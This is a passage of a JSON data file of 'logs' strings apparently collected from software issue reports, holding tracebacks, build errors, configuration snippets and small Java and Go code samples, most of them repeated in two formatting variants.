3567)\r\n[2018-06-22 14:19:06 +0000] [3562] [INFO] Shutting down: Master\r\n[2018-06-22 14:19:06 +0000] [3562] [INFO] Reason: Worker failed to boot."
    },
    {
        "logs": "`\r\nTolerations:     CriticalAddonsOnly\r\n                 dedicated:NoSchedule\r\n                 node.kubernetes.io/memory-pressure:NoSchedule\r\n                 node.kubernetes.io/not-ready:NoExecute for 300s\r\n                 node.kubernetes.io/unreachable:NoExecute for 300s\r\n"
    },
    {
        "logs": "```\r\nTolerations:     CriticalAddonsOnly\r\n                 dedicated:NoSchedule\r\n                 node.kubernetes.io/memory-pressure:NoSchedule\r\n                 node.kubernetes.io/not-ready:NoExecute for 300s\r\n                 node.kubernetes.io/unreachable:NoExecute for 300s\r\n"
    },
    {
        "logs": "`\r\n{\r\n  \"packageId\": \"ws.hbang.newterm2\",\r\n  \"action\": \"notworking\",\r\n  \"userInfo\": {\r\n    \"arch32\": false,\r\n    \"packageId\": \"ws.hbang.newterm2\",\r\n    \"deviceId\": \"iPhone8,2\",\r\n    \"url\": \"http://cydia.saurik.com/package/ws.hbang.newterm2/\",\r\n    \"iOSVersion\": \"12.4\",\r\n    \"packageVersionIndexed\": false,\r\n    \"packageName\": \"NewTerm (iOS 10 \u00e2\u0080\u0093 13)\",\r\n    \"category\": \"Terminal Support\",\r\n    \"repository\": \"Chariz\",\r\n    \"name\": \"NewTerm (iOS 10 \u00e2\u0080\u0093 13)\",\r\n    \"installed\": \"2.3\",\r\n    \"packageIndexed\": true,\r\n    \"packageStatusExplaination\": \"A matching version of this tweak for this iOS version could not be found. Please submit a review if you choose to install.\",\r\n    \"id\": \"ws.hbang.newterm2\",\r\n    \"commercial\": false,\r\n    \"packageInstalled\": true,\r\n    \"tweakCompatVersion\": \"0.1.5\",\r\n    \"shortDescription\": \"A powerful terminal app for iOS\",\r\n    \"latest\": \"2.3\",\r\n    \"author\": \"HASHBANG Productions\",\r\n    \"packageStatus\": \"Unknown\"\r\n  },\r\n  \"base64\": \"eyJhcmNoMzIiOmZhbHNlLCJwYWNrYWdlSWQiOiJ3cy5oYmFuZy5uZXd0ZXJtMiIsImRldmljZUlkIjoiaVBob25lOCwyIiwidXJsIjoiaHR0cDpcL1wvY3lkaWEuc2F1cmlrLmNvbVwvcGFja2FnZVwvd3MuaGJhbmcubmV3dGVybTJcLyIsImlPU1ZlcnNpb24iOiIxMi40IiwicGFja2FnZVZlcnNpb25JbmRleGVkIjpmYWxzZSwicGFja2FnZU5hbWUiOiJOZXdUZXJtIChpT1MgMTAg4oCTIDEzKSIsImNhdGVnb3J5IjoiVGVybWluYWwgU3VwcG9ydCIsInJlcG9zaXRvcnkiOiJDaGFyaXoiLCJuYW1lIjoiTmV3VGVybSAoaU9TIDEwIOKAkyAxMykiLCJpbnN0YWxsZWQiOiIyLjIuMSIsInBhY2thZ2VJbmRleGVkIjp0cnVlLCJwYWNrYWdlU3RhdHVzRXhwbGFpbmF0aW9uIjoiQSBtYXRjaGluZyB2ZXJzaW9uIG9mIHRoaXMgdHdlYWsgZm9yIHRoaXMgaU9TIHZlcnNpb24gY291bGQgbm90IGJlIGZvdW5kLiBQbGVhc2Ugc3VibWl0IGEgcmV2aWV3IGlmIHlvdSBjaG9vc2UgdG8gaW5zdGFsbC4iLCJpZCI6IndzLmhiYW5nLm5ld3Rlcm0yIiwiY29tbWVyY2lhbCI6ZmFsc2UsInBhY2thZ2VJbnN0YWxsZWQiOnRydWUsInR3ZWFrQ29tcGF0VmVyc2lvbiI6IjAuMS41Iiwic2hvcnREZXNjcmlwdGlvbiI6IkEgcG93ZXJmdWwgdGVybWluYWwgYXBwIGZvciBpT1MiLCJsYXRlc3QiOiIyLjMiLCJhdXRob3IiOiJIQVNIQkFORyBQcm9kdWN0aW9ucyIsInBhY2thZ2VTdGF0dXMiOiJVbmtub3duIn0=\",\r\n  \"chosenStatus\": \"not working\",\r\n  \"notes\": \"Crashes upon entering\"\r\n}\r\n"
    },
    {
        "logs": "```\r\n{\r\n  \"packageId\": \"ws.hbang.newterm2\",\r\n  \"action\": \"notworking\",\r\n  \"userInfo\": {\r\n    \"arch32\": false,\r\n    \"packageId\": \"ws.hbang.newterm2\",\r\n    \"deviceId\": \"iPhone8,2\",\r\n    \"url\": \"http://cydia.saurik.com/package/ws.hbang.newterm2/\",\r\n    \"iOSVersion\": \"12.4\",\r\n    \"packageVersionIndexed\": false,\r\n    \"packageName\": \"NewTerm (iOS 10 \u00e2\u0080\u0093 13)\",\r\n    \"category\": \"Terminal Support\",\r\n    \"repository\": \"Chariz\",\r\n    \"name\": \"NewTerm (iOS 10 \u00e2\u0080\u0093 13)\",\r\n    \"installed\": \"2.3\",\r\n    \"packageIndexed\": true,\r\n    \"packageStatusExplaination\": \"A matching version of this tweak for this iOS version could not be found. Please submit a review if you choose to install.\",\r\n    \"id\": \"ws.hbang.newterm2\",\r\n    \"commercial\": false,\r\n    \"packageInstalled\": true,\r\n    \"tweakCompatVersion\": \"0.1.5\",\r\n    \"shortDescription\": \"A powerful terminal app for iOS\",\r\n    \"latest\": \"2.3\",\r\n    \"author\": \"HASHBANG Productions\",\r\n    \"packageStatus\": \"Unknown\"\r\n  },\r\n  \"base64\": \"eyJhcmNoMzIiOmZhbHNlLCJwYWNrYWdlSWQiOiJ3cy5oYmFuZy5uZXd0ZXJtMiIsImRldmljZUlkIjoiaVBob25lOCwyIiwidXJsIjoiaHR0cDpcL1wvY3lkaWEuc2F1cmlrLmNvbVwvcGFja2FnZVwvd3MuaGJhbmcubmV3dGVybTJcLyIsImlPU1ZlcnNpb24iOiIxMi40IiwicGFja2FnZVZlcnNpb25JbmRleGVkIjpmYWxzZSwicGFja2FnZU5hbWUiOiJOZXdUZXJtIChpT1MgMTAg4oCTIDEzKSIsImNhdGVnb3J5IjoiVGVybWluYWwgU3VwcG9ydCIsInJlcG9zaXRvcnkiOiJDaGFyaXoiLCJuYW1lIjoiTmV3VGVybSAoaU9TIDEwIOKAkyAxMykiLCJpbnN0YWxsZWQiOiIyLjIuMSIsInBhY2thZ2VJbmRleGVkIjp0cnVlLCJwYWNrYWdlU3RhdHVzRXhwbGFpbmF0aW9uIjoiQSBtYXRjaGluZyB2ZXJzaW9uIG9mIHRoaXMgdHdlYWsgZm9yIHRoaXMgaU9TIHZlcnNpb24gY291bGQgbm90IGJlIGZvdW5kLiBQbGVhc2Ugc3VibWl0IGEgcmV2aWV3IGlmIHlvdSBjaG9vc2UgdG8gaW5zdGFsbC4iLCJpZCI6IndzLmhiYW5nLm5ld3Rlcm0yIiwiY29tbWVyY2lhbCI6ZmFsc2UsInBhY2thZ2VJbnN0YWxsZWQiOnRydWUsInR3ZWFrQ29tcGF0VmVyc2lvbiI6IjAuMS41Iiwic2hvcnREZXNjcmlwdGlvbiI6IkEgcG93ZXJmdWwgdGVybWluYWwgYXBwIGZvciBpT1MiLCJsYXRlc3QiOiIyLjMiLCJhdXRob3IiOiJIQVNIQkFORyBQcm9kdWN0aW9ucyIsInBhY2thZ2VTdGF0dXMiOiJVbmtub3duIn0=\",\r\n  \"chosenStatus\": \"not working\",\r\n  \"notes\": \"Crashes upon entering\"\r\n}\r\n"
    },
    {
        "logs": "`console\r\n$ . spack/share/spack/setup-env.sh\r\n$ spack find -p zlib\r\n==> 1 installed package\r\n-- cray-cnl7-broadwell / gcc@8.3.0 ------------------------------\r\nzlib@1.2.11  /users/ialberto/spack/opt/spack/cray-cnl7-broadwell/gcc-8.3.0/zlib-1.2.11-vzj5ovtigy7pllfrxfghaw3r3wjogw7h\r\n$ spack load zlib\r\nModuleCmd_Load.c(244):ERROR:105: Unable to locate a modulefile for 'zlib-1.2.11-gcc-8.3.0-vzj5ovt'\r\n"
    },
    {
        "logs": "`\r\nFile \"/Home-Assistant-custom-components-Xiaomi-Cloud-Map-Extractor/custom_components/xiaomi_cloud_map_extractor/image_handler.py\", line 194, in draw_texts\r\n    text_config[CONF_FONT], text_config[CONF_FONT_SIZE])\r\nKeyError: 'font'\r\n"
    },
    {
        "logs": "```\r\nFile \"/Home-Assistant-custom-components-Xiaomi-Cloud-Map-Extractor/custom_components/xiaomi_cloud_map_extractor/image_handler.py\", line 194, in draw_texts\r\n    text_config[CONF_FONT], text_config[CONF_FONT_SIZE])\r\nKeyError: 'font'\r\n"
    },
    {
        "logs": "`\n<issue_comment>username_2: I would also be careful and choose carefully what you color. Pygments isn't always the best highlighter. Sometimes coloring certain classes in certain languages is awful in other languages. You kind of need to balance it. More of an FYI.\r\n\r\nAlso, not everyone wants rainbow code (I'm speaking generally, not offering my personal opinion either way). IIRC, Material was aiming to highlight important things, but not necessarily everything for a technicolor code highlighting experience. Some highlighting classes are arguably more important than others.\n<issue_comment>username_0: @username_2 Your comment seems distant from the issue at hand. In fact, fixing this issue would reduce the variability of colors, not increase it.\n<issue_comment>username_2: @username_0, I am speaking about other classes that are maybe not highlighted. I'm also speaking from experience playing with highlighting classes and trying to highlight languages better than Material does with Pygments. I'm not specifically speaking about "
    },
    {
        "logs": "`java\r\n// client \r\n        requesterMono = rsocketRequesterBuilder.setupRoute(SETUP_ROUTE)\r\n            .setupData(new ObjectMapper().writeValueAsString(getAuthInfo()))\r\n            .dataMimeType(MimeTypeUtils.parseMimeType(WellKnownMimeType.APPLICATION_JSON.getString()))\r\n            .rsocketConnector(connector -> connector.acceptor(responder).fragment(MTU_BYTE_SIZE)\r\n                .keepAlive(Duration.ofSeconds(KEEP_ALIVE_INTERVAL_SEC), Duration.ofSeconds(KEEP_ALIVE_MAX_TIME_SEC))\r\n                .reconnect(Retry.fixedDelay(Integer.MAX_VALUE, Duration.ofSeconds(RSOCKET_RETRY_INTERVAL_SECONDS))\r\n                    .doAfterRetry(retrySignal -> log.warn(\"RSocket client is reconnecting to get the newest connection....\"))))\r\n            .connect(TcpClientTransport.create(TcpClient.create()\r\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, TCP_CONN_TIMEOUT)\r\n                .option(ChannelOption.TCP_NODELAY, true)\r\n                .option(ChannelOption.SO_KEEPALIVE, true)\r\n                .host(consoleDomain)\r\n                .port(SERVER_PORT)\r\n                .secure(ssl -> ssl.sslContext(sslContext))));\r\n\r\n// register a socket acceptor interceptor to receive the authentication setup payload object in the server side\r\n    protected SocketAcceptorInterceptor genAcceptorAuthInterceptor() {\r\n        SocketAcceptorInterceptor interceptor = acceptor -> (setup, sendingSocket) -> {\r\n            try {\r\n                log.info(\"receive an task connection try to init.\");\r\n                LocalTaskAuthInfo authInfo = new ObjectMapper().readValue(setup.getDataUtf8(), LocalTaskAuthInfo.class);\r\n\r\n              //ignore some non-related code...\r\n                return acceptor.accept(setup, sendingSocket);\r\n            } catch (Exception e) {\r\n                String errMsg = \"try to accept a connection error.msg:\" + ExceptionUtils.getRootCauseMessage(e);\r\n                log.warn(errMsg, e);\r\n                exceptionService.saveException(new SidecarRuntimeException(e));\r\n                return Mono.error(new RSocketAuthException(errMsg));\r\n            }\r\n        };\r\n        return interceptor;\r\n    }\r\n\r\n\r\n\r\n//server\r\n RSocketServer.create(routeHandler.responder()).fragment(RSocketConnConstans.MTU_BYTE_SIZE)\r\n            .interceptors(registry -> registry.forSocketAcceptor(interceptor))\r\n            .bind(TcpServerTransport.create(TcpServer.create()\r\n                .option(EpollChannelOption.SO_KEEPALIVE, true)\r\n                .option(EpollChannelOption.TCP_NODELAY, true)\r\n                .secure(ssl -> ssl.sslContext(sslContext))\r\n                .port(Integer.valueOf(consoleConfig.getRsocketConsolePort()))\r\n                .doOnConnection(\r\n                    t -> log.info(\"New sidecar CONNECTED. Pay attention that this is maybe a resumed connection...\"))))\r\n            .subscribe();\r\n"
    },
    {
        "logs": "`java\r\n\r\npackage com.clougence.test.rsocket;\r\n\r\nimport static com.clougence.clouddm.comm.constants.rsocket.RSocketConnConstants.MTU_BYTE_SIZE;\r\n\r\nimport java.time.Duration;\r\n\r\nimport org.junit.jupiter.api.BeforeAll;\r\nimport org.junit.jupiter.api.Test;\r\nimport org.springframework.boot.test.context.SpringBootTest;\r\nimport org.springframework.http.codec.json.Jackson2JsonDecoder;\r\nimport org.springframework.http.codec.json.Jackson2JsonEncoder;\r\nimport org.springframework.messaging.handler.annotation.MessageMapping;\r\nimport org.springframework.messaging.rsocket.RSocketRequester;\r\nimport org.springframework.messaging.rsocket.RSocketStrategies;\r\nimport org.springframework.messaging.rsocket.annotation.support.RSocketMessageHandler;\r\nimport org.springframework.util.MimeTypeUtils;\r\nimport org.springframework.web.util.pattern.PathPatternRouteMatcher;\r\nimport com.clougence.clouddm.base.metadata.auth.ConnAuthDTO;\r\nimport com.clougence.clouddm.comm.constants.rsocket.RSocketConnConstants;\r\nimport com.clougence.clouddm.comm.util.HostUtil;\r\nimport com.fasterxml.jackson.databind.ObjectMapper;\r\nimport io.netty.channel.ChannelOption;\r\nimport io.netty.channel.epoll.EpollChannelOption;\r\nimport io.rsocket.SocketAcceptor;\r\nimport io.rsocket.metadata.WellKnownMimeType;\r\nimport io.rsocket.transport.netty.client.TcpClientTransport;\r\nimport io.rsocket.transport.netty.server.TcpServerTransport;\r\nimport lombok.SneakyThrows;\r\nimport lombok.extern.slf4j.Slf4j;\r\nimport reactor.core.publisher.Mono;\r\nimport reactor.netty.tcp.TcpClient;\r\nimport reactor.netty.tcp.TcpServer;\r\nimport reactor.test.StepVerifier;\r\nimport reactor.util.retry.Retry;\r\n\r\n/**\r\n * @author wanshao create time is 2021/3/2\r\n **/\r\n@SpringBootTest\r\n@Slf4j\r\npublic class TestSetupPayload {\r\n\r\n    private static Mono<RSocketRequester> requesterMono;\r\n\r\n    private final static int              SERVER_PORT                    = 5678;\r\n\r\n    private final static int              TCP_CONN_TIMEOUT               = 3000;\r\n    private final static int              RSOCKET_RETRY_INTERVAL_SECONDS = 5;\r\n    private final static int              KEEP_ALIVE_INTERVAL_SEC        = 5;\r\n    private final static int              KEEP_ALIVE_MAX_TIME_SEC        = 30;\r\n\r\n    @SneakyThrows\r\n    @BeforeAll\r\n    public static void setupOnce() {\r\n        RSocketStrategies rSocketStrategies = RSocketStrategies.builder()\r\n            .encoders(encoders -> encoders.add(new Jackson2JsonEncoder()))\r\n            .decoders(decoders -> decoders.add(new Jackson2JsonDecoder()))\r\n            .routeMatcher(new PathPatternRouteMatcher())\r\n            .build();\r\n        RSocketRequester.Builder rsocketRequesterBuilder = RSocketRequester.builder().rsocketStrategies(rSocketStrategies);\r\n        ConnAuthDTO connAuthDTO = ConnAuthDTO.builder()\r\n            //\r\n            .ak(\"myak\")\r\n            .sk(\"mysk\")\r\n            .ip(HostUtil.getHostIp())\r\n            .wsn(\"wsn\")\r\n            .sendAuthTimeMs(System.currentTimeMillis())\r\n            .build();\r\n\r\n        SocketAcceptor responder = RSocketMessageHandler.responder(rSocketStrategies, new TestSetupPayload());\r\n\r\n        // init server\r\n        io.rsocket.core.RSocketServer.create()\r\n            .interceptors(registry -> registry.forSocketAcceptor(new TestSocketAcceptor()))\r\n            .acceptor(responder)\r\n            .fragment(RSocketConnConstants.MTU_BYTE_SIZE)\r\n[Truncated]\n\r\n    @Override\r\n    public SocketAcceptor apply(SocketAcceptor socketAcceptor) {\r\n        return (setup, sendingSocket) -> {\r\n            try {\r\n                // Here will occur issue\r\n                ConnAuthDTO authInfo = new ObjectMapper().readValue(setup.getDataUtf8(), ConnAuthDTO.class);\r\n\r\n                return socketAcceptor.accept(setup, sendingSocket);\r\n            } catch (Exception e) {\r\n                String errMsg = \"try to accept a connection error.msg:\" + ExceptionUtils.getRootCauseMessage(e);\r\n                log.warn(errMsg, e);\r\n                return Mono.error(new com.clougence.clouddm.base.metadata.rpc.rsocket.RSocketAuthException(errMsg));\r\n            }\r\n        };\r\n    }\r\n\r\n}\r\n\r\n"
    },
    {
        "logs": "`javascript\r\noptions: {\r\n                    port: 9099,\r\n                    open: false,\r\n                    // Change this to '0.0.0.0' to access the server from outside\r\n                    // hostname: 'localhost'\r\n                    hostname: '0.0.0.0',\r\n                    protocol: 'https',\r\n                    key: grunt.file.read('cert.key').toString(),\r\n                    cert: grunt.file.read('cert.crt').toString(),\r\n                    ca: [\r\n                        grunt.file.read('cert.crt').toString()\r\n                    ]\r\n              }\r\n"
    },
    {
        "logs": "```javascript\r\noptions: {\r\n                    port: 9099,\r\n                    open: false,\r\n                    // Change this to '0.0.0.0' to access the server from outside\r\n                    // hostname: 'localhost'\r\n                    hostname: '0.0.0.0',\r\n                    protocol: 'https',\r\n                    key: grunt.file.read('cert.key').toString(),\r\n                    cert: grunt.file.read('cert.crt').toString(),\r\n                    ca: [\r\n                        grunt.file.read('cert.crt').toString()\r\n                    ]\r\n              }\r\n"
    },
    {
        "logs": "`\r\nasciidoctor: WARNING: image to embed not found or not readable: \\\r\n/path/to/src/main/asciidoc/images/diag-0eecdb8aae25da40f6cf41c33fce8cb1.png\r\n"
    },
    {
        "logs": "```\r\nasciidoctor: WARNING: image to embed not found or not readable: \\\r\n/path/to/src/main/asciidoc/images/diag-0eecdb8aae25da40f6cf41c33fce8cb1.png\r\n"
    },
    {
        "logs": "`\r\n\u276f ccm create dse476 --dse --dse-username= --dse-password= -n 1 -v 4.7.6\r\n# fails due to #443\r\n\u276f ccm add node1 --dse -i 127.0.0.1 -j 7199 -t 127.0.0.1 -l 127.0.0.1 --binary-itf 127.0.0.1 --remote-debug-port 0 -n 0\r\n\u276f ccm status\r\nTraceback (most recent call last):\r\n  File \"/usr/local/bin/ccm\", line 72, in <module>\r\n    cmd.validate(parser, options, args)\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/cmds/cluster_cmds.py\", line 385, in validate\r\n    Cmd.validate(self, parser, options, args, load_cluster=True)\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/cmds/command.py\", line 68, in validate\r\n    self.cluster = self._load_current_cluster()\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/cmds/command.py\", line 97, in _load_current_cluster\r\n    return ClusterFactory.load(self.path, name)\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/cluster_factory.py\", line 48, in load\r\n    cluster.nodes[node_name] = Node.load(cluster_path, node_name, cluster)\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/node.py\", line 135, in load\r\n    node = cluster.create_node(data['name'], data['auto_bootstrap'], tuple(itf['thrift']), tuple(itf['storage']), data['jmx_port'], remote_debug_port, initial_token, save=False, binary_interface=binary_interface, byteman_port=data['byteman_port'])\r\nTypeError: create_node() got multiple values for keyword argument 'byteman_port'\r\n"
    },
    {
        "logs": "`\r\nDEBUG http://seleniumwire/requests 200\r\nDEBUG:seleniumwire.proxy.handler:http://seleniumwire/requests 200\r\nDEBUG http://seleniumwire/response_body?request_id=6f7ba003-9c3c-4b58-a837-73c853488590 200\r\nDEBUG:seleniumwire.proxy.handler:http://seleniumwire/response_body?request_id=6f7ba003-9c3c-4b58-a837-73c853488590 200\r\n----------------------------------------\r\nException happened during processing of request from ('127.0.0.1', 36218)\r\nTraceback (most recent call last):\r\n  File \"/usr/lib/python3.5/socketserver.py\", line 625, in process_request_thread\r\n    self.finish_request(request, client_address)\r\n  File \"/usr/lib/python3.5/socketserver.py\", line 354, in finish_request\r\n    self.RequestHandlerClass(request, client_address, self)\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/proxy2.py\", line 65, in __init__\r\n    super().__init__(*args, **kwargs)\r\n  File \"/usr/lib/python3.5/socketserver.py\", line 681, in __init__\r\n    self.handle()\r\n  File \"/usr/lib/python3.5/http/server.py\", line 422, in handle\r\n    self.handle_one_request()\r\n  File \"/usr/lib/python3.5/http/server.py\", line 410, in handle_one_request\r\n    method()\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 125, in do_GET\r\n    super().do_GET()\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/proxy2.py\", line 147, in do_GET\r\n    self.admin_handler()\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 36, in admin_handler\r\n    self._get_response_body(**params)\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 72, in _get_response_body\r\n    self._send_body(body)\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 77, in _send_body\r\n    self._send_response(body, 'application/octet-stream')\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 115, in _send_response\r\n    self.wfile.write(body)\r\n  File \"/usr/lib/python3.5/socket.py\", line 593, in write\r\n    return self._sock.send(b)\r\nTypeError: a bytes-like object is required, not 'str'\r\n"
    },
    {
        "logs": "```\r\nDEBUG http://seleniumwire/requests 200\r\nDEBUG:seleniumwire.proxy.handler:http://seleniumwire/requests 200\r\nDEBUG http://seleniumwire/response_body?request_id=6f7ba003-9c3c-4b58-a837-73c853488590 200\r\nDEBUG:seleniumwire.proxy.handler:http://seleniumwire/response_body?request_id=6f7ba003-9c3c-4b58-a837-73c853488590 200\r\n----------------------------------------\r\nException happened during processing of request from ('127.0.0.1', 36218)\r\nTraceback (most recent call last):\r\n  File \"/usr/lib/python3.5/socketserver.py\", line 625, in process_request_thread\r\n    self.finish_request(request, client_address)\r\n  File \"/usr/lib/python3.5/socketserver.py\", line 354, in finish_request\r\n    self.RequestHandlerClass(request, client_address, self)\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/proxy2.py\", line 65, in __init__\r\n    super().__init__(*args, **kwargs)\r\n  File \"/usr/lib/python3.5/socketserver.py\", line 681, in __init__\r\n    self.handle()\r\n  File \"/usr/lib/python3.5/http/server.py\", line 422, in handle\r\n    self.handle_one_request()\r\n  File \"/usr/lib/python3.5/http/server.py\", line 410, in handle_one_request\r\n    method()\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 125, in do_GET\r\n    super().do_GET()\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/proxy2.py\", line 147, in do_GET\r\n    self.admin_handler()\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 36, in admin_handler\r\n    self._get_response_body(**params)\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 72, in _get_response_body\r\n    self._send_body(body)\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 77, in _send_body\r\n    self._send_response(body, 'application/octet-stream')\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 115, in _send_response\r\n    self.wfile.write(body)\r\n  File \"/usr/lib/python3.5/socket.py\", line 593, in write\r\n    return self._sock.send(b)\r\nTypeError: a bytes-like object is required, not 'str'\r\n"
    },
    {
        "logs": "`\r\n[ 94%] Building CXX object baxter_simulator/baxter_sim_io/CMakeFiles/baxter_sim_io.dir/qrc_sim_io.cxx.o\r\n/home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp: In member function \u2018bool arm_kinematics::Kinematics::readJoints(urdf::Model&)\u2019:\r\n/home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp:248:65: error: conversion from \u2018urdf::LinkConstSharedPtr {aka std::shared_ptr<const urdf::Link>}\u2019 to non-scalar type \u2018boost::shared_ptr<const urdf::Link>\u2019 requested\r\n   boost::shared_ptr<const urdf::Link> link = robot_model.getLink(tip_name);\r\n                                              ~~~~~~~~~~~~~~~~~~~^~~~~~~~~~\r\n/home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp:255:60: error: no match for \u2018operator=\u2019 (operand types are \u2018boost::shared_ptr<const urdf::Joint>\u2019 and \u2018urdf::JointConstSharedPtr {aka std::shared_ptr<const urdf::Joint>}\u2019)\r\n       joint = robot_model.getJoint(link->parent_joint->name);\r\n                                                            ^\r\nIn file included from /usr/include/boost/shared_ptr.hpp:17:0,\r\n                 from /opt/ros/melodic/include/ros/forwards.h:37,\r\n                 from /opt/ros/melodic/include/ros/common.h:37,\r\n                 from /opt/ros/melodic/include/ros/ros.h:43,\r\n                 from /home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp:35:\r\n/usr/include/boost/smart_ptr/shared_ptr.hpp:547:18: note: candidate: boost::shared_ptr<T>& boost::shared_ptr<T>::operator=(const boost::shared_ptr<T>&) [with T = const urdf::Joint]\r\n     shared_ptr & operator=( shared_ptr const & r ) BOOST_SP_NOEXCEPT\r\n                  ^~~~~~~~\r\n"
    },
    {
        "logs": "```\r\n[ 94%] Building CXX object baxter_simulator/baxter_sim_io/CMakeFiles/baxter_sim_io.dir/qrc_sim_io.cxx.o\r\n/home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp: In member function \u2018bool arm_kinematics::Kinematics::readJoints(urdf::Model&)\u2019:\r\n/home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp:248:65: error: conversion from \u2018urdf::LinkConstSharedPtr {aka std::shared_ptr<const urdf::Link>}\u2019 to non-scalar type \u2018boost::shared_ptr<const urdf::Link>\u2019 requested\r\n   boost::shared_ptr<const urdf::Link> link = robot_model.getLink(tip_name);\r\n                                              ~~~~~~~~~~~~~~~~~~~^~~~~~~~~~\r\n/home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp:255:60: error: no match for \u2018operator=\u2019 (operand types are \u2018boost::shared_ptr<const urdf::Joint>\u2019 and \u2018urdf::JointConstSharedPtr {aka std::shared_ptr<const urdf::Joint>}\u2019)\r\n       joint = robot_model.getJoint(link->parent_joint->name);\r\n                                                            ^\r\nIn file included from /usr/include/boost/shared_ptr.hpp:17:0,\r\n                 from /opt/ros/melodic/include/ros/forwards.h:37,\r\n                 from /opt/ros/melodic/include/ros/common.h:37,\r\n                 from /opt/ros/melodic/include/ros/ros.h:43,\r\n                 from /home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp:35:\r\n/usr/include/boost/smart_ptr/shared_ptr.hpp:547:18: note: candidate: boost::shared_ptr<T>& boost::shared_ptr<T>::operator=(const boost::shared_ptr<T>&) [with T = const urdf::Joint]\r\n     shared_ptr & operator=( shared_ptr const & r ) BOOST_SP_NOEXCEPT\r\n                  ^~~~~~~~\r\n"
    },
    {
        "logs": "`\r\n11-02 04:31:27.330 31645 31645 D AllegroActivity: onPause\r\n11-02 04:31:27.341 31645 31645 D AllegroActivity: onPause end\r\n11-02 04:31:27.341 31645 31664 D Animatch: [HandleEvent] ALLEGRO_EVENT_DISPLAY_SWITCH_OUT\r\n11-02 04:31:27.483 31645 31664 D Animatch: [PauseExecution] Engine halted.\r\n11-02 04:31:27.483 31645 31664 D Animatch: [MainloopEvents] al_wait_for_event\r\n11-02 04:31:27.527 31645 31645 D AllegroActivity: onSaveInstanceState\r\n11-02 04:31:27.528 31645 31645 D AllegroActivity: onStop.\r\n11-02 04:31:27.665 31645 31645 D AllegroSurface: surfaceDestroyed\r\n11-02 04:31:27.665 31645 31664 D Animatch: [HandleEvent] ALLEGRO_EVENT_DISPLAY_HALT_DRAWING\r\n11-02 04:31:27.666 31645 31664 D AllegroEGL: egl_clearCurrent\r\n11-02 04:31:27.667 31645 31664 D AllegroEGL: egl_clearCurrent done\r\n11-02 04:31:28.667 31645 31664 D Animatch: [MainloopEvents] al_wait_for_event\r\n\r\n11-02 04:31:37.524  2369  2398 W ActivityManager: Activity stop timeout for ActivityRecord{e97a94e u0 com.holypangolin.Animatch/net.dosowisko.libsuperderpy.Activity t3172}\r\n11-02 04:31:37.525  2369  2398 I ActivityManager: Activity reported stop, but no longer stopping: ActivityRecord{e97a94e u0 com.holypangolin.Animatch/net.dosowisko.libsuperderpy.Activity t3172}\r\n"
    },
    {
        "logs": "```\r\n  if (typeof text !== 'string' || !text.match(/^[a-zA-Z\\-0-9]+$/)) {\r\n    console.error(colors.red + `You did not pass in a valid hostname`)\r\n    process.exit(1)\r\n  }\r\n"
    },
    {
        "logs": "`\r\n\turl := \"https://api.ipify.org?format=text\"\r\n\tresp, err := http.Get(url)\r\n\tdefer resp.Body.Close()\r\n\tip, err := ioutil.ReadAll(resp.Body)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tfmt.Printf(\"My IP is:%s\\n\", ip)\r\n"
    },
    {
        "logs": "`\r\n\turl := \"https://api.ipify.org?format=text\"\r\n\tresp, err := http.Get(url)\r\n\tdefer resp.Body.Close()\r\n\tip, err := ioutil.ReadAll(resp.Body)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tfmt.Printf(\"My IP is:%s\\n\", ip)\r\n"
    },
    {
        "logs": "`\r\nfunc main() {\r\n\tctx, cancel := context.WithCancel(context.Background())\r\n\tdefer cancel()\r\n\r\n\th, err := libp2p.New(ctx)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\th2, _ := libp2p.New(ctx)\r\n\th3, _ := libp2p.New(ctx)\r\n\th4, _ := libp2p.New(ctx)\r\n\r\n\tfmt.Println(h2, h3, h4)\r\n\tfmt.Printf(\"IP is %s\\n\", h2.Addrs())\r\n}\r\n"
    },
    {
